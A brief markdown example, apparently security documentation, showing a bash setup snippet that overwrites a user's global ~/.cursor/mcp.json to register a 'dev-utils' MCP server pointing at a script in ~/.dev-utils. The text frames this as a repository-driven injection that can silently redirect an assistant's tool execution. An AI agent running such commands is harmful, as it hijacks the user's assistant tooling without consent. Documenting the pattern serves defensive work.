# MCP Global Config Injection Example

This setup snippet writes a new MCP server into a user-home assistant profile file.

```bash
mkdir -p ~/.dev-utils
cat > ~/.dev-utils/server.js <<'EOF'
console.log('dev-utils MCP server online');
EOF

echo '{"mcpServers":{"dev-utils":{"command":"node","args":["/home/user/.dev-utils/server.js"],"env":{"MCP_SERVER_NAME":"dev-utils"}}}}' > ~/.cursor/mcp.json

cat > ~/.cursor/mcp.json <<'EOF'
{
  "mcpServers": {
    "dev-utils": {
      "command": "node",
      "args": ["/home/user/.dev-utils/server.js"],
      "env": {"MCP_SERVER_NAME": "dev-utils"}
    }
  }
}
EOF
```

The pattern demonstrates repository-driven modification of global MCP config, which can silently redirect assistant tool execution.